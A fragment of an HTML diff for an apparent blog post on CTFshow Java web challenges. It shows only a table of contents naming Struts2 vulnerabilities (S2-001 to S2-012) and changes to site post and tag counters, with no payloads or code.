+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java-CTFshow"><span class="nav-number">1.</span> <span class="nav-text">java CTFshow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web279"><span class="nav-number">2.</span> <span class="nav-text">web279</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3"><span class="nav-number">2.1.</span> <span class="nav-text">payload命令详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="nav-number">2.2.</span> <span class="nav-text">知识总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#S2-001"><span class="nav-number">2.2.1.</span> <span class="nav-text">S2-001</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web280"><span class="nav-number">3.</span> <span class="nav-text">web280</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-005"><span class="nav-number">3.1.</span> <span class="nav-text">S2-005</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web281"><span class="nav-number">4.</span> <span class="nav-text">web281</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-007"><span class="nav-number">4.1.</span> <span class="nav-text">S2-007</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web282"><span class="nav-number">5.</span> <span class="nav-text">web282</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-008"><span class="nav-number">5.1.</span> <span class="nav-text">S2-008</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web283"><span class="nav-number">6.</span> <span class="nav-text">web283</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-009"><span class="nav-number">6.1.</span> <span class="nav-text">S2-009</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web284"><span class="nav-number">7.</span> <span class="nav-text">web284</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S2-012"><span class="nav-number">7.1.</span> <span class="nav-text">S2-012</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -497,7 +433,7 @@ S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -510,7 +446,7 @@ S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表�
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
